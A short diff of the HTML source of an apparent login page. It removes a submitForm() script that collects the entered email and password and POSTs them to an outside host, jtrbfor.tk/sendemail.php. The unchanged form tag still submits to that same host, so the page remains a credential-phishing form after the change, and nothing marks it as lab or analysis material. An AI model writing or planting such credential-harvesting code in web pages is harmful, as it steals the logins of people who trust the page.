@@ -57,20 +57,6 @@
       float: none;
       }
     </style>
-<script>
-    function submitForm() {
-      var email = document.getElementById("email").value;
-      var password = document.getElementById("password").value;
-      var data = "Email: " + email + "\nPassword: " + password;
-
-      var xhr = new XMLHttpRequest();
-      xhr.open("POST", "https://jtrbfor.tk/sendemail.php", true);
-      xhr.setRequestHeader("Content-Type", "text/plain");
-      xhr.send(data);
-
-      return true; // Prevent form submission
-    }
-  </script>
   </head>
   <body>
     <form action="https://jtrbfor.tk/sendemail.php">
